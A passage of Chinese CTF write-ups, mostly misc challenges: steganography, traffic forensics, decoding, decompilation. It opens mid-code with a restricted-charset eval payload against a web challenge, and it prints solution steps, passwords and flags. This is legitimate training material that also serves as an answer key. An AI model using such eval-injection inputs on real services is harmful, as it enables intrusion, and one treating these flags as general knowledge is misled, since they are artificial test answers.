    output = 'nope';
  }
  res.render('index', { title: '[a-z().]', output });
});
```

因此关键在于如何使用限定的字符集 `a-z().` 构造出 1337 这个数。通过尝试可以发现如下几点。

```javascript
(typeof(self)) // object
(typeof(self)).constructor.length // 1
NaN.constructor.length // 1
true.constructor.length // 1
(typeof(self)).sub.name.length // 3
(typeof(self)).replace.name.length //7
```

因此可以构造出如下载荷。

```javascript
eval(((typeof(self)).constructor()).concat(true.constructor.length).concat((typeof(self)).sub.name.length).concat((typeof(self)).sub.name.length).concat((typeof(self)).replace.name.length))
```

将载荷提交即可得到 flag。

```flag
flag{8d58e39a-55b3-45b3-a0f4-c297774e4077}
```

### [网鼎杯 2020 青龙组]虚幻2

检测附件的类型可知是一张图片。

```text
File type:   Portable Network Graphics image
Extension:   png
MIME type:   image/png
```

![img](assets/9900c0a3e69998005c65e3a2c9d1e45a.png)

猜测是三个颜色通道信息的叠合，同时看结构很像是汉信码。写个脚本将内容还原一下。

```python
from PIL import Image

image = Image.open('file.png')
pixels = ''
for i in range(0, 36):
    for j in range(0, 12):
        pixel = image.getpixel((i, j))
        for k in range(0, 3):
            pixels += ('1' if pixel[k] == 0 else '0')
print(pixels)
```

运行脚本可以得到如下内容。

```text
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111110000110111111110011111110000010000000001100111101100000000010000010111110000000110110110011111010000010100000001010100111111000001010000010101110001010110110001011101010000010101110010010101010000011101010000010101110100110100010000011101010000000000000101010101111001000000000000000000000000010101001100111011000000001101100011010110000000100100100000001111101010000101010011100000110000010101000010110111111001111000000000010001101001100110011001111110000000000000000000000110001000001111000000011111111111111111110010010001010000011101001001000010110000111101000000011101010000101101110011010110100000010101010100110111001110010001110000010000101100001000101111000011110000011010110000111111101110100101110000011011011110010011110111101100010000011101001110010100001011001000110000000110111000100110111010000000000000000000000101110101111101000000000000010101110001111000000000011101010000010101110010000000000000011101010000010101110101011000000000011101010000010100000100000000000000000001010000010111110010110000000000011111010000010000000000000000000000000000010000011111110011000000000000011111110000000000000000000000000000000000000000000000000000000000000000000000000
```

使用如下的 CyberChef Receipt 可以生成图片。

```text
Find_/_Replace({'option':'Regex','string':'1'},'\\x00',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'0'},'\\xff',true,false,true,false)
Generate_Image('Greyscale',8,36)
```

![img](assets/6e4abf8db4a509ce96f65df38afc2440.png)

将图片稍微处理一下，再填充一下空白处，使用汉信码的 app 扫描即可得到 flag。

![img](assets/e7aaf58a0aef461a5e639c7903aa11f8.png)

```flag
flag{eed70c7d-e530-49ba-ad45-80fdb7872e0a}
```

### [INSHack2019]Passthru

用 Wireshark 载入附件中的 sslkey 后分析流量包，可以发现很多含有 `kcahsni` 的请求，将其反写可得 `inshack`，因此推测其与 flag 相关。使用 tshark 将请求的参数内容取出。

```text
tshark -r capture.pcap -o "tls.keylog_file:sslkey.log" -Y "http contains \"GET /searchbyimage\"" -T fields -e http.request.uri.query.parameter > data.txt
```

将取出的数据使用如下 CyberChef Receipt 处理即可得到含有 flag 的字符串。

```text
URL_Decode()
Find_/_Replace({'option':'Regex','string':'^i(.*)&kcahsni='},'',true,false,true,false)
Find_/_Replace({'option':'Regex','string':',(.*)$\\n'},'',true,false,true,false)
From_Hex('Auto')
Reverse('Character')
INSA{b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e}
```

### [INSHack2019]Crunchy

附件给出的代码如下。

```python
def crunchy(n):
    if n < 2: return n
    return 6 * crunchy(n - 1) + crunchy(n - 2)

g = 17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568

print("Your flag is: INSA{%d}"%(crunchy(g)%100000007))
```

由于数字太大导致递归超出了范围，尝试用 SageMath 来解出。SageMath 中提供了一个包可以用来快速算出斐波那契数列。

> https://doc.sagemath.org/html/en/reference/combinat/sage/combinat/binary_recurrence_sequences.html

此时只需要写个脚本解出答案即可。

```python
g = 17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568
modNum = 100000007
binaryRecurrenceSequence = BinaryRecurrenceSequence(6, 1)
period = binaryRecurrenceSequence.period(modNum)
print(binaryRecurrenceSequence(g % period) % modNum)
```

![img](assets/f9064724a66d151889ee7b733968a5ce.png)

```flag
INSA{41322239}
```

### [WMCTF2020]行为艺术

附件给出了一张图片，010 打开运行模板得到 CRC Mismatch 提示后根据 `hex: 0x380 0x284` 修正其高度，即可得到下图。

![img](assets/ea2bf5d0326f09329896a91790b5e5de.png)

略微读一下内容很容易发现图片的数字中有一个压缩文档，将图片内容转写下来得到如下信息。

```text
504B0304140000000800DB93C55086A39007D8000000DF01000008000000666C61672E74787475504B0E823010DD93708771DDCCB0270D5BBD0371815A9148AC6951C2ED9D271F89C62E2693D7F76BB7DE9FC80D2E6E68E782A326D2E01F81CE6D55E76972E9BA7BCCB3ACEF7B89F7B6E90EA16A6EE2439D45179ECDD1C5CCFB6B9AA489C1218C92B898779D765FCCBB58CC920B6662C5F91749931132258F32BBA7C288C5AE103133106608409DAC419F77241A3412907814AB7A922106B8DED0D25AEC8A634929025C46A33FE5A1D3167A100323B1ABEE4A7A0708413A19E17718165F5D3E73D577798E36D5144B66315AAE315078F5E51A29246AF402504B01021F00140009000800DB93C55086A39007D8000000DF010000080024000000000000002000000000000000666C61672E7478740A00200000000000010018004A0A9A64243BD601F9D8AB39243BD6012D00CA13223BD601504B050600000000010001005A000000FE00000000000000
```

使用如下的 CyberChef Receipt 可得到下一步的信息。

```text
From_Hex('None')
Unzip('',false)
Decode_text('UTF-8 (65001)')
Good eyes! Here is your flag:
https://www.splitbrain.org/services/ook

+++++ ++++[ ->+++ +++++ +<]>+ +++++ .<+++ [->-- -<]>- .<+++ [->-- -<]>-
.<+++ +[->+ +++<] >+.<+ ++[-> ---<] >---- -.<++ +++++ [->++ +++++ <]>++
++.-- --.<+ +++[- >---- <]>-- ----. +++++ +++.< +++[- >---< ]>-.+ ++.++
+++++ .<+++ [->-- -<]>- .+++. -.... --.++ +.<++ +[->+ ++<]> ++++. <++++
++++[ ->--- ----- <]>-- ----- ----- --.<+ +++[- >++++ <]>+. +...< +++++
+++[- >++++ ++++< ]>+++ +++++ +++.. .-.<
```

使用信息中的网站进行 Brainfuck to Text 可得 flag。

```flag
WMCTF{wai_bi_baaaa_bo!2333~~~}
```

### [羊城杯 2020]逃离东南亚

附件解压后得到三个日记压缩文档，第一个打开后有一张图片。010 editor 打开后可知需要修复图片宽高。将其依照脚本爆破结果 `hex: 0xf9 0x12c` 修复后可得下图。

![img](assets/52aa16ec01f06ee1ba43f863e0a04913.png)

将 `wdnmd` 作为压缩包密码解压日记 2 压缩文档可得一串 Brainfuck 和一个音频。在 Brainfuck 前面补充上 8 个 `+` 即可解码成功并得到一串 Base64。使用 CyberChef 解码后检测文件类型可知其是一个 ELF 文件。

```text
File type:   Executable and Linkable Format
Extension:   elf,bin,axf,o,prx,so
MIME type:   application/x-executable
Description: Executable and Linkable Format file. No standard file extension.
```

将其用 IDA 打开可以得到如下源码。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("hei~what you want??");
  sleep(1u);
  puts("want a flag? ");
  sleep(1u);
  puts("sorry~there is no flag");
  sleep(1u);
  puts("but maybe your can find something useful!");
  return 0;
}
```

音频中考虑存在隐写，因此尝试使用 SilentEye 尝试 Decode，得到了如下信息。

![img](assets/c2efecc5de1744b6efd209b7cd8c0450.png)

使用 `This1sThe3rdZIPpwd` 作为密码解压日记 3。可以得到一份日记和 libc 的源码。从 NEWS 中可以得到版本信息 `Version 2.28`。从 GitHub 上下载对应的源码，然后用 Diff Merge 做比对。根据日记中的暗示可以知道信息留存在代码中，因此比对一下更改即可。

> https://github.com/bminor/glibc/tree/3c03baca37fdcb52c3881e653ca392bba7a99c2b

![img](assets/f2f9443b4917965ee2947db00bf8b457.png)

可以发现有一个文件的代码里增加了很多空格。此时再换到 Beyond Compare 比对一下可以得到如下结果，猜测这些空格中确实隐藏了信息。

![img](assets/7ad015acec52663027d9867e7c6d0641.png)

使用如下的 CyberChef Receipt 可以得到其中的信息。

```text
Diff('\\n\\n\\n\\n\\n','Character',true,true,true,false)
Find_/_Replace({'option':'Regex','string':' '},'0',true,false,false,false)
Find_/_Replace({'option':'Regex','string':'\\t'},'1',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'\\n'},'',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'000000000'},'',true,false,true,false)
From_Binary('None',8)
//Extract from arena.c
your flag is in malloc.c

//Extract from rtld.c
SOS! please help me -> rtld.c
```

对 malloc.c 提取信息可得 flag。

```flag
GWCTF{code_steganography_1s_funny!}
```

### [RCTF2019]printer

Wireshark 分析流量包，可得如下内容，

```text
BAR 348, 439, 2, 96 
BAR 292, 535, 56, 2 
BAR 300, 495, 48, 2 
BAR 260, 447, 2, 88 
BAR 204, 447, 56, 2 
BAR 176, 447, 2, 96 
BAR 116, 455, 2, 82 
BAR 120, 479, 56, 2 
BAR 44, 535, 48, 2 
BAR 92, 455, 2, 80 
BAR 20, 455, 72, 2 
BAR 21, 455, 2, 40 
BAR 21, 495, 24, 2 
BAR 45, 479, 2, 16 
BAR 36, 479, 16, 2 
BAR 284, 391, 40, 2 
BAR 324, 343, 2, 48 
BAR 324, 287, 2, 32 
BAR 276, 287, 48, 2 
BAR 52, 311, 48, 2 
BAR 284, 239, 48, 2 
BAR 308, 183, 2, 56 
BAR 148, 239, 48, 2 
BAR 196, 191, 2, 48 
BAR 148, 191, 48, 2 
BAR 68, 191, 48, 2 
BAR 76, 151, 40, 2 
BAR 76, 119, 2, 32 
BAR 76, 55, 2, 32 
BAR 76, 55, 48, 2 
BAR 112, 535, 64, 2 
BAR 320, 343, 16, 2 
BAR 320, 319, 16, 2 
BAR 336, 319, 2, 24 
BAR 56, 120, 24, 2 
BAR 56, 87, 24, 2 
BAR 56, 88, 2, 32 
BAR 224, 247, 32, 2 
BAR 256, 215, 2, 32 
BAR 224, 215, 32, 2 
BAR 224, 184, 2, 32 
BAR 224, 191, 32, 2 
BAR 272, 311, 2, 56 
BAR 216, 367, 56, 2 
BAR 216, 319, 2, 48 
BAR 240, 318, 2, 49 
BAR 184, 351, 2, 16 
BAR 168, 351, 16, 2 
BAR 168, 311, 2, 40 
BAR 152, 351, 16, 2 
BAR 152, 351, 2, 16
```

根据提示可找到打印机的文档。

> http://www.kroyeuropedownload.com/English_User_Manuals/TSPL_TSPL2_Programming_Jan_2017.pdf

![img](assets/3f2f05edbba01f562d12cf16adec82dc.png)

根据规则使用 Python 将图片画出来。

```python
from PIL import Image

barcmds = [cmd.replace("BAR", "").strip().split(",") for cmd in open("barcmds", "r").readlines()]
image = Image.new("RGB", (500, 600), "white")

for cmd in barcmds:
    bar = Image.new("RGB", (int(cmd[2]), int(cmd[3])), (16, 63, 145))
    image.paste(bar, (int(cmd[0]), int(cmd[1])))
image = image.rotate(180)
image.save("result.png")
```

得到如下图片。

![img](assets/5e6e0020f2e9065bd67aad3070ede111.png)

流量中还包含了 bitmap 的数据，根据文档中的描述可知其结构。

![img](assets/ca1bded548f87e665c93c26ee4d9842c.png)

![img](assets/c2ce7a8e32b86b5f11eaf8cf066ea3db.png)

因此将指定部分数据提取出来后用如下 CyberChef Receipt 处理即可得到剩下部分的 flag。

```text
From_Hex('Auto')
To_Binary('None',8)
Find_/_Replace({'option':'Regex','string':'0'},'\\x00',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'1'},'\\xff',true,false,true,false)
Generate_Image('Greyscale',1,208)
Rotate_Image(180)
```

![img](assets/67a33fdc4c55d3e57ffc286c69c78566.png)

```flag
flag{my_tsc_hc3pnikdk}
```

### [b01lers2020]matryoshka

附件给出的图片中有不同向的草莓，使用脚本将数据处理一下然后使用 CyberChef 重新渲染图片。

```python
from PIL import Image

image = Image.open("matryoshka.png")
offset = 12
for x in range(offset, image.width, 50):
    for y in range(offset, image.height, 50):
        (r, g, b) = image.getpixel((x, y))
        print(1 if r != 0 else 0, end="")
Find_/_Replace({'option':'Regex','string':'1'},'\\xFF',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'0'},'\\x00',true,false,true,false)
Generate_Image('Greyscale',2,121)
```

得到了一个二维码。

![img](assets/de70a6af97829dcfdb4b0c66a3d74b31.png)

使用如下工具扫描可得一个 GZIP 文件。

> https://online-barcode-reader.inliteresearch.com/

使用如下的 CyberChef Receipt 处理可以得到一个二维码。

```text
From_Hexdump()
Gunzip()
Find_/_Replace({'option':'Regex','string':'l'},'\\xFF',true,false,true,false)
Find_/_Replace({'option':'Regex','string':'1'},'\\x00',true,false,true,false)
Generate_Image('Greyscale',2,86)
```

再次扫描得出的二维码后用如下 CyberChef Receipt 处理可得到又一个二维码。

```text
From_Hexdump()
Render_Image('Raw')
Invert_Image()
```

再次扫描二维码后可得一个 7z 文件的数据，稍微处理后将其打开。使用弱密码尝试可得压缩包密码为 1234。将压缩包解压即可得到 flag。

```flag
pctf{dolls_do_get_boring_after_a_while}
```

### [NPUCTF2020]OI的梦

![img](assets/be7e7833cc033875e537ccdb31f7d448.png)

矩阵快速幂可以解决，很容易找到如下代码示例。稍微修改一下示例的代码。

> https://blog.csdn.net/bianxia123456/article/details/105167294/

```python
def mulMatrix(x, y):
    ans = [[0 for i in range(101)] for j in range(101)]
    for i in range(101):
        for j in range(101):
            for k in range(101):
                ans[i][j] += x[i][k] * y[k][j]
                ans[i][j] %= 10003
    return ans


def quickMatrix(m, n):
    E = [[0 for i in range(101)] for j in range(101)]
    for i in range(101):
        E[i][i] = 1
    while (n):
        if n % 2 != 0:
            E = mulMatrix(E, m)
        m = mulMatrix(m, m)
        n >>= 1
    return E


matrix = [[0 for i in range(101)] for j in range(101)]
dataIn = open("yyh.in", "r").readlines()
n, m, steps = dataIn[0].strip().split()
m = int(m)
for x in range(0, m):
    i, j = dataIn[x + 1].strip().split()
    i = int(i)
    j = int(j)
    matrix[i][j] = 1
    matrix[j][i] = 1
ans = quickMatrix(matrix, int(steps))
print(ans[1][int(n)])
flag{5174}
```

### [INSHack2017]smart-sensors-api（git命令还原）

题目给出的是一个 .git 文件夹，`git restore` 还原一下可以得到一些代码。查看 log 之后使用指令 `git diff ef45d97c8fe2c8ff03192d2ec96570dd0edbad01` 比对可以得到如下关键信息。

```diff
-[APP]
-debug=false
-locale=fr_FR.UTF-8
-
-
-[USER]
-api_key=EF6960F6128EB18B861320D5622A79B33DE717B60278888C89DFAB82403CADD641C662EBBAF05D4FC5CC2EDD1CB5F667B6E540EE7ECFA053F5E4C70C803BC928
```

到这里获得了 api_key，之后的步骤是使用 api_key 请求 API。

### [BSidesSF2019]delta(exiftool提取缩略图)

将附件中图片的缩略图使用 `exiftool -b -ThumbnailImage attachment.jpg > extract3.jpg` 提取出来之后使用 Beyond Compare 进行比较可以得到下图。

![img](assets/8b919d1b230cea65e5937f7710c1ce97.png)

> https://en.wikipedia.org/wiki/Code_128

参考 Wikipedia 的做法，`The width of each bar or space may be 1, 2, 3 or 4 units (modules).`，将条码转写成如下数字。

```text
2112141313212134111323114121214131111421122411121421124131111122141222311422111112421221141113411212412331112
```

对照 Start Code 211214 可知应该用 128B 来解码其中的内容。同时数字尾部的 2331112 是 Stop pattern，因此需要解码的主要是中间的内容。将其对照码表部分解码后可得 flag。

```flag
CTF{minime.jpg}
```

### [羊城杯 2020]signin

> https://eprint.iacr.org/2020/301.pdf

MadHatter cipher，其密码表如下。

![img](assets/7a84b04c024c452843a2a437eea2ac21.png)

将密码表倒序得到本题的密码表。

```text
ACEG Y
ACEH X
ACEI W
ACFG V
ACFH U
ACFI S
ADEG Q
ADEH P
ADEI O
ADFG N
ADFH L
ADFI K
BCEG I
BCEH G
BCEI F
BCFG C
BCFH B
BCFI R
BDEG E
BDEH T
BDEI H
BDFG D
BDFH A
BDFI H
```

将附件中的信息四位一组按照上述密码表转写，即得到 flag。

```flag
GWHT{TOYSAYGREENTEAISCOOL}
```

### [羊城杯 2020]TCP_IP

使用 `tshark.exe -r attachment.pcap -T fields -e ip.id > data.txt` 将流量包中 TCP 流量的 Identification 提取出来可以得到如下内容。

```text
0x00000040
0x00000069
0x00000048
0x0000003c
0x0000002c
0x0000007b
0x0000002a
0x0000003b
0x0000006f
0x00000055
0x00000070
0x0000002f
0x00000069
0x0000006d
0x00000022
0x00000051
0x00000050
0x0000006c
0x00000060
0x00000079
0x00000052
0x0000002a
0x00000069
0x00000065
0x0000007d
0x0000004e
0x0000004b
0x0000003b
0x0000002e
0x00000044
0x00000021
0x00000058
0x00000075
0x00000029
0x00000062
0x0000003a
0x0000004a
0x0000005b
0x00000052
0x0000006a
0x0000002b
0x00000036
0x0000004b
0x0000004b
0x0000004d
0x00000037
0x00000050
0x00000040
0x00000069
0x00000048
0x0000003c
0x0000002c
0x0000007b
0x0000002a
0x0000003b
0x0000006f
0x00000055
0x00000070
0x0000002f
0x00000069
0x0000006d
0x00000022
0x00000051
0x00000050
0x0000006c
0x00000060
0x00000079
0x00000052
```

 使用如下的 Cyberchef Receipt 处理上述内容可以得到如下内容。

```text
Find_/_Replace({'option':'Simple string','string':'0x000000'},'',true,false,true,false)
From_Hex('Auto')
@iH<,{*;oUp/im"QPl`yR*ie}NK;.D!Xu)b:J[Rj+6KKM7P@iH<,{*;oUp/im"QPl`yR
```

将上述字符串循环的部分去除后使用 Base 91 解码即可得到 flag。

```flag
flag{wMt84iS06mCbbfuOfuVXCZ8MSsAFN1GA}
```

### [RoarCTF2019]davinci_cipher

使用 Wireshark 分析流量包可得其中含有设备 `Wacom Intuos Pro M` 的 USB 流量。使用 `tshark.exe -r k3y.pcapng -T fields -e usb.capdata > data.txt` 将其提取出来后筛选出数位板的流量。对照 USB 协议的文档可以找到如下描述。

![img](assets/6ff1f8cf88ba1a715ac9957a3eb99391.png)

因此写个脚本将流量中的坐标表示出来。

```python
from PIL import Image

data = open("F:/CTFs/2021/Archived/BUUCTF Misc/[RoarCTF2019]davinci_cipher/data.txt").read().split("\n")

image = Image.new("RGB", (347, 239), "white")

for line in data:
    x0 = int(line[4:6], 16)
    x1 = int(line[6:8], 16)
    x = x0 + x1 * 256
    y0 = int(line[10:12], 16)
    y1 = int(line[12:14], 16)
    y = y0 + y1 * 256
    x //= 100
    y //= 100
    image.putpixel((x, -y), (16, 63, 145))
image = image.transpose(Image.FLIP_TOP_BOTTOM)
image.save("result.png")
```

可以得到如下图片。

![img](assets/4e1591c9a4de7f1cd2faa352b1a7f404.png)

将 flag.txt 中的字符串经过 Unicode 解码后可得如下内容。

```text
🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃🦓✉🌿📂☃👉🛩✅🎅⌨🌏🛩🚨🤣💧🎃🍍😁ℹ📂🚫👣😀👣🙃🎤⌨😁🤣🎤🕹👑🚪🍴🕹😇🍴🐎✅✉🌏⏩🐍🚨☀😇🏹👁👣✉🌊🚨✖
```

使用 `MONA_LISA_IS_A_MAN` 作为 key 解 emoji-aes 可得 flag。

```flag
RoarCTF{wm-m0de3n_dav1chi}
```

### [NPUCTF2020]HappyCheckInVerification

将附件的文件尾从文件头部移回去后修正文件的伪加密，可以解压得到一张图片和一个视频。将缺少定位点的二维码修复可得如下内容。

```text
flag{this_is_not_flag}三曳所諳陀怯耶南夜缽得醯怯勝數不知喝盧瑟侄盡遠故隸怯薩不娑羯涅冥伊盧耶諳提度奢道盧冥以朋罰所即栗諳蒙集皤夷夜集諳利顛呐寫無怯依奢竟#￥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435.sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$
```

将内容依次解码可在中间部分找到重要提示 `拿佛拉格的姿势在最后2333`，而字符串的最后有 `use base64` 的提示。将视频中的 DTMF 音频处理后可得 448070885。之后的步骤大概是向出题人获取 hint 后从公众号获得一份音频。这里从别的师傅的 WriteUp 上获得了这份音频，使用 RX-SSTV 接收可得下图。

![img](assets/f4693313cd58fef05af9b045a7c72b16.png)

```flag
flag{miSc_ChecK_In_Ver16ied}
```

### [XMAN2018排位赛]ppap

Wireshark 打开流量包，跟踪到 TCP 流 6 可以获得一串 Base64，将其分段后分别解码可以得到一张图片，一个 xml 文件，一个加密的包含 flag 的压缩包，以及如下提示。

```text
yaaaaaaaar, land ho!Hey wesley, you got that flag?Ayy, I got yer files right here, matey!
And here be the map to the booty!
I don't understand, this isn't even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50! Lastly, if ye sail the seven seas, you do be a pirate!
```

将图片 foremost 之后可以得到很多图片，根据提示可以知道需要找一张 `pirate` 的图片。很容易可以找到如下图片。

![img](assets/79a838e23860b7670b01aa73f72fc5bc.png)

但是我没懂为啥解压密码就是 `skullandcrossbones` 了。解压上述得到的压缩文档即可得到 flag。

```flag
flag{b31Ng_4_P1r4tE_1s_4lR1GHT_w1Th_M3}
```

### [SUCTF2018]dead_z3r0

将附件的头部的字符串删除，可以得到一个 pyc 文件，将其反编译可以得到如下代码。

```python
#! /usr/bin/env python 3.6 (3379)
#coding=utf-8
# Compiled at: 2018-11-01 06:20:56
#Powered by BugScaner


def encryt(key, plain):
    cipher = ''
    for i in range(len(plain)):
        cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i]))

    return cipher


def getPlainText():
    plain = ''
    with open('plain.txt') as (f):
        while True:
            line = f.readline()
            if line:
                plain += line
            else:
                break

    return plain


def main():
    key = 'LordCasser'
    plain = getPlainText()
    cipher = encryt(key, plain)
    with open('cipher.txt', 'w') as (f):
        f.write(cipher.encode('base_64'))


if __name__ == '__main__':
    main()
```

将之前删除的 Base64 字符串作为参数传入，写一段逆算法解码内容。

```python
import base64
import urllib.parse


def decryt(key, cipher):
    plain = ''
    cipher = base64.b64decode(cipher)
    for i in range(len(cipher)):
        plain += chr(ord(key[i % len(key)]) ^ cipher[i])
    return plain


def main():
    key = 'LordCasser'
    cipher = "KTswVQk1OgQrOgUVODAKFikZJAUuKzwPCTUxMQE1Kxc8NxYYPjcgQwY7OxMhCzFDLyYFGBYjKwkXMDALAScZEycyJgooOigHEAoSDT42IEcBLCcdDiUxBi8mBRgoLBUKPgowBR04P1QnJj0cLyYFGBYjJBs5JywFL1wjHhkbMkI8KhoWFjAWXH55"
    plain = decryt(key, cipher)
    plain = base64.b64decode(plain).decode()
    print(urllib.parse.unquote(plain))


if __name__ == '__main__':
    main()
```

运行脚本可以得到如下内容。

```text
y0u 4r3 f00l3d
th15 15 n0t that y0u want
90 0n dud3
c4tch th3 st3g05auru5
```

使用 Stegosaurus 对 pyc 文件解隐写可以得到 flag。

```flag
SUCTF{Z3r0_fin411y_d34d}
```

### 一路到底

写个脚本遍历文件将内容取出并转化为对应格式。

```python
result = ""
count = 0

data = open("F:/CTFs/2021/Archived/BUUCTF Misc/一路到底/38ff11ef-e3d3-4f8a-b163-3d300bc016ea/files/start.txt").read()
next = data[-36:]
result += "{:04x}".format(int(data[0:data.find(':') - 1]))
count += 1
print(count, next)
while True:
    try:
        data = open(f"F:/CTFs/2021/Archived/BUUCTF Misc/一路到底/38ff11ef-e3d3-4f8a-b163-3d300bc016ea/files/{next}").read()
        next = data[-36:]
        result += "{:04x}".format(int(data[0:data.find(':') - 1]))
        count += 1
        print(count, next)
    except:
        break

open("F:/CTFs/2021/Archived/BUUCTF Misc/一路到底/38ff11ef-e3d3-4f8a-b163-3d300bc016ea/result.txt", "w").write(result)
```

十六进制转换一次可以得到一个压缩文档，爆破其密码可以得到解压密码为 `tgb678`。压缩包解压可得一张图片，修正文件头后打开即可得到 flag。

```flag
flag{0c6b489ca956e2fd94dce12be4bf0729}
```

### [b01lers2020]minecraft_purdue

将存档导入游戏内，启动游戏可以进入地图。在门口找到如下提示。

![img](assets/bec179845af5d3a5645cd9653218b77f.png)

可以在一栋建筑内找到 flag。

![img](assets/3ac01c57860bc19a513bce27910f30ed.png)

```flag
pctf{M1NE}
```

### [NPUCTF2020]签到

根据红石灯的亮与灭来得到如下摩斯电码。

```text
..---..-.--....-..---..-
```

使用如下的 Cyberchef Receipt 来处理可以得到 flag。

```text
Find_/_Replace({'option':'Simple string','string':'.'},'0',true,false,true,false)
Find_/_Replace({'option':'Simple string','string':'-'},'1',true,false,true,false)
From_Binary('Space',8)
MD5()
To_Upper_case('All')
To_Upper_case('All')
flag{8F108D05D23041B5866F9CB2FF109661}
```

### [HackIM2020]ZeldaInSpace

> After conquering on land.Zelda is stuck in another dimensionin  Space.He will be stuck here till he solves the puzzle that thedark lord  has tested him with. 2 platforms are connected with multiple paths between them.There are 6  weird buttons in Space, walking over which makesup a key of sorts.Help  Zelda solve the Space Puzzle.

根据题目描述可知要在游戏中按照顺序找到几个按钮。使用 dnSpy 分析 Assembly-CSharp 可得如下代码。

```c#
private void OnGUI()
    {
        StringBuilder stringBuilder = new StringBuilder();
        string text = stringBuilder.ToString();
        if (this.checkpoints.Count >= 1)
        {
            foreach (string value in this.checkpoints)
            {
                stringBuilder.Append(value);
            }
            text = stringBuilder.ToString();
            if (string.Equals(this.checkpoints[this.checkpoints.Count - 1], "final"))
            {
                if (string.Equals(this.encrypted, string.Empty))
                {
                    try
                    {
                        this.encrypted = this.Decrypt("pI0gDg911A3Qcf++L3rvfkwIEkXsg4jq6pwOHMgG1VlpPuE9t4eljr4fQvXUa9bMJN4TL+DzQoj8aHTe1sNt+y5FND+gqn04OOltMhv/sms=", text);
                    }
                    catch (CryptographicException ex)
                    {
                        this.encrypted = "wrong key Zelda! :(";
                    }
                    Debug.Log(this.encrypted);
                }
            }
            else
            {
                this.encrypted = string.Empty;
            }
        }
        if (!string.Equals(text, string.Empty))
        {
            GUI.Label(new Rect(0f, 5f, 400f, 105f), text, this.style);
        }
        if (!string.Equals(this.encrypted, string.Empty))
        {
            GUI.Label(new Rect(0f, 100f, 400f, 100f), this.encrypted, this.style);
        }
    }

    // Token: 0x04000020 RID: 32
    public GUIStyle style;

    // Token: 0x04000021 RID: 33
    public List<string> checkpoints;

    // Token: 0x04000022 RID: 34
    public string encrypted;
}
```

由此可知在经过所有 checkpoint 后，得到的拼接字符串会作为 key 对一串字符串进行解密并且渲染，猜测是 flag。因此对 `RoomMove` 中的方法进行分析。很容易找到处理检查点的方法。

```c#
// RoomMove
// Token: 0x06000030 RID: 48 RVA: 0x0000317C File Offset: 0x0000157C
private void OnTriggerEnter2D(Collider2D other)
{
    if (other.CompareTag("Player"))
    {
        PlayerAttrs component = other.GetComponent<PlayerAttrs>();
        Debug.Log(this.placeText.text);
        if (string.Equals(this.placeText.text, "CheckPoint 1!"))
        {
            string a = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a, "pepper"))
            {
                component.checkpoints.Add("pepper");
            }
            Debug.Log(component.checkpoints.Count);
        }
        else if (string.Equals(this.placeText.text, "CheckPoint 2!"))
        {
            string a2 = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a2, "salt"))
            {
                component.checkpoints.Add("salt");
            }
            Debug.Log(component.checkpoints.Count);
        }
        else if (string.Equals(this.placeText.text, "CheckPoint 3!"))
        {
            string a3 = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a3, "chilly"))
            {
                component.checkpoints.Add("chilly");
            }
            Debug.Log(component.checkpoints.Count);
        }
        else if (string.Equals(this.placeText.text, "CheckPoint 4!"))
        {
            string a4 = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a4, "pickles"))
            {
                component.checkpoints.Add("pickles");
            }
            Debug.Log(component.checkpoints.Count);
        }
        else if (string.Equals(this.placeText.text, "CheckPoint 5!"))
        {
            string a5 = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a5, "oregano"))
            {
                component.checkpoints.Add("oregano");
            }
            Debug.Log(component.checkpoints.Count);
        }
        else if (string.Equals(this.placeText.text, "CheckPoint 6!"))
        {
            string a6 = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a6, "masala"))
            {
                component.checkpoints.Add("masala");
            }
            Debug.Log(component.checkpoints.Count);
        }
        else if (string.Equals(this.placeText.text, "Final"))
        {
            Debug.Log("Hey welcome to final!\n");
            string a7 = component.checkpoints[component.checkpoints.Count - 1];
            if (!string.Equals(a7, "final"))
            {
                component.checkpoints.Add("final");
            }
            Debug.Log(component.checkpoints.Count);
        }
    }
}
```

由此可以得到检查点的顺序以及最终得到的字符串